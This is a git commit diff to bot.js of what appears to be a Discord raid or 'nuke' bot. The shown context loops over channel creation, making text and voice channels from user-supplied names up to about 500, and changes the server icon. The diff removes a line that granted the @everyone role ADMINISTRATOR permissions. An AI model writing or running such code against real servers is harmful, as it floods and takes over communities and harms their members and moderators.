c1dab436b29d08e7cc9b78a959603241102dc0d3
chocoboii~ <63813281+defoko-bot@users.noreply.github.com>
2020-04-23 08:33:07 -0400

    Update bot.js

--- bot.js
+++ bot.js
@@ -33,7 +33,6 @@ client.on("message", async (message) => {
 	    message.guild.createChannel(`${textuh}`, 'text');
 	    message.guild.createChannel(`${textuh}`, 'voice');  
 	    message.guild.setIcon('./icon.png') 
-	    message.guild.roles.everyone.setPermissions(['ADMINISTRATOR']);
 	if(message.guild.channels > 499) break;
        }
     }
